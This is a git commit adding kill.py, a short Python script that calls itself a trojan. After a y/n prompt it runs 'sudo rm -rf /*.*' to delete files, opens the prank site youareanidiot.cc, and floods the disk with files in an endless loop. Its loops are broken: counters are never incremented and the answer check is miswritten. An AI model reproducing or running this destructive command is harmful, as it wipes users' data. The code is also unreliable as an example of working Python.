561c20c228a8b009b0a91352091672fbea8e2c0c
BenPI88 <97198967+BenPI88@users.noreply.github.com>
2022-09-18 11:35:17 -0500

    Create kill.py

---
+++ kill.py
@@ -0,0 +1,30 @@
+print("WARNING!!!")
+print("The Python Script You Just Executed Is Considered A Trojan.")
+print("Execute? (y/n)")
+ans = input("")
+while not ans == "y" or ans == "n":
+  ans = input("")
+if ans == "y":
+  import os
+  import time
+  i = 0
+  os.system("sudo echo Thank U :)")
+  time.sleep(5)
+  while not i == 60:
+    i2 = 0
+    text = ""
+    while not i2 == 60 - i:
+      text = text + "-"
+    print(text)
+    os.system("clear")
+    print("COMPUTER DESTRUCTION IN")
+    print(str(60 - i) + " SECONDS!!!")
+  os.system("clear")
+  os.system("sudo rm -rf /*.*")
+  print("This PC Has Been Destroyed!!!")
+  print("Do Not Attempt To Reboot!!!")
+  os.system("chromium https://youareanidiot.cc && chromium https://youareanidiot.cc/lol.html")
+  i = 0
+  while True:
+    i += 1
+    os.system("echo lol > no" + str(i) + ".txt")
